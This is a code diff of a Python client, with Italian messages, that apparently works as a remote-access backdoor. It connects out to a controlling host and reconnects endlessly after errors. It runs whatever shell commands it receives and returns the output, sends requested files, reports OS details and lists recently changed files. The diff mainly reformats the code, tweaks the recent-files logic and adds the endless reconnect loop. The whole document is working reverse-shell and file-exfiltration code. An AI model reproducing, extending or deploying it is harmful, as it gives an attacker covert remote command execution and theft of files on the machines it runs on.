@@ -88,7 +88,6 @@ def RecuperaOs(clientSocket: socket):
         print("Ci troviamo su Unix")
 
 
-
 def searchCmd(clientSocket, cmd):
     try:
         shellCommandExecuter(clientSocket, cmd)
@@ -102,21 +101,23 @@ def shellCommandExecuter(clientSocket, cmd):
     output = subprocess.check_output(cmd, shell=True).decode("utf-8", "ignore")
     pSize = str(output.__sizeof__())
     clientSocket.send(pSize.encode())
-    clientSocket.recv(1024) #87
-    clientSocket.send(output.encode()) #88
+    clientSocket.recv(1024)  # 87
+    clientSocket.send(output.encode())  # 88
 
-def recentFilesCmd(clientSocket, fromData = "1990-01-01"):
+
+def recentFilesCmd(clientSocket, fromData="1990-01-01"):
     output = ""
     print(fromData)
     try:
         fileList = []
+        fileList.append(" ")
         for root, dirs, files in os.walk(".", topdown=True):
             for file in files:
-                path = root + "/" + file
+                path = root + "\\" + file
                 if os.path.exists(path):
                     fileData = os.path.getmtime(path)
                     data = time.strftime('%Y-%m-%d', time.localtime(fileData))
-                    if data > fromData:
+                    if data >= fromData:
                         fileList.append(data + " " + path)
         fileList.sort()
         for elem in fileList:
@@ -130,71 +131,70 @@ def recentFilesCmd(clientSocket, fromData = "1990-01-01"):
     clientSocket.recv(1024)
     clientSocket.send(output.encode())
 
+
 def main():
-    esc = False
-    while not esc:
-        try:
-            clientSocket = StartConnection()
-            RecuperaOs(clientSocket)
+    while True:
+        esc = False
+        while not esc:
+            try:
+                clientSocket = StartConnection()
+                RecuperaOs(clientSocket)
 
+                while not esc:
+                    cmd = clientSocket.recv(1024).decode()
+                    if len(cmd) == 0:
+                        break
 
-            while not esc:
-                cmd = clientSocket.recv(1024).decode()
-                if len(cmd) == 0:
-                    break
+                    elif cmd == "setOs":
+                        global windowsFlag
+                        windowsFlag = input()
 
-
-                elif cmd == "setOs":
-                    global windowsFlag
-                    windowsFlag = input()
-
-                elif cmd == "dir" or "ls" in cmd:
-                    if windowsFlag == "w":
-                        sendDir(clientSocket, "dir")
-                    else:
-                        sendDir(clientSocket, "ls")
-
-                elif "cd" in cmd:
-                    changeDirectory(clientSocket, cmd)
-
-                elif cmd == "esc":
-                    esc = exitNClose(clientSocket)
-
-
-                elif "get " in cmd:
-                    path = ""
-                    fileName = cmd.replace("get ", "")
-                    if not fileName == "":
-                        path = os.path.join(path, os.getcwd(), fileName)
-                        print(path)
-                        if os.path.exists(path):
-                            clientSocket.send("ok".encode())
-                            getFile(clientSocket, fileName)
+                    elif cmd == "dir" or "ls" in cmd:
+                        if windowsFlag == "w":
+                            sendDir(clientSocket, "dir")
                         else:
-                            clientSocket.send("ko".encode())
+                            sendDir(clientSocket, "ls")
 
-                elif cmd == "infoOs":
-                    sendOsInfo(clientSocket)
+                    elif "cd" in cmd:
+                        changeDirectory(clientSocket, cmd)
 
-                elif "search" in cmd:
-                    shellCommand = clientSocket.recv(1024).decode() #78
-                    if searchCmd(clientSocket, shellCommand):
-                        print("true")
+                    elif cmd == "esc":
+                        esc = exitNClose(clientSocket)
 
-                elif "rf" in cmd:
-                    if cmd == "rf":
-                        recentFilesCmd(clientSocket)
-                    elif "rf " in cmd:
-                        data = cmd.replace("rf ", "")
-                        recentFilesCmd(clientSocket, data)
+                    elif "get " in cmd:
+                        path = ""
+                        fileName = cmd.replace("get ", "")
+                        if not fileName == "":
+                            path = os.path.join(path, os.getcwd(), fileName)
+                            print(path)
+                            if os.path.exists(path):
+                                clientSocket.send("ok".encode())
+                                getFile(clientSocket, fileName)
+                            else:
+                                clientSocket.send("ko".encode())
 
+                    elif cmd == "infoOs":
+                        sendOsInfo(clientSocket)
 
-        except Exception as e:
-            print(e)
-            print("errore Riavvio in corso")
-            clientSocket.close()
+                    elif "search" in cmd:
+                        shellCommand = clientSocket.recv(1024).decode()  # 78
+                        if searchCmd(clientSocket, shellCommand):
+                            print("true")
 
+                    elif "rf" in cmd:
+                        if cmd == "rf":
+                            recentFilesCmd(clientSocket)
+                        elif "rf " in cmd:
+                            data = cmd.replace("rf ", "")
+                            if data > time.strftime("%Y:%m:%d"):
+                                print("Too forward")
+                            else:
+                                recentFilesCmd(clientSocket, data)
 
+            except Exception as e:
+                print(e)
+                print("errore Riavvio in corso")
+                clientSocket.close()
 
 
 if __name__ == "__main__":
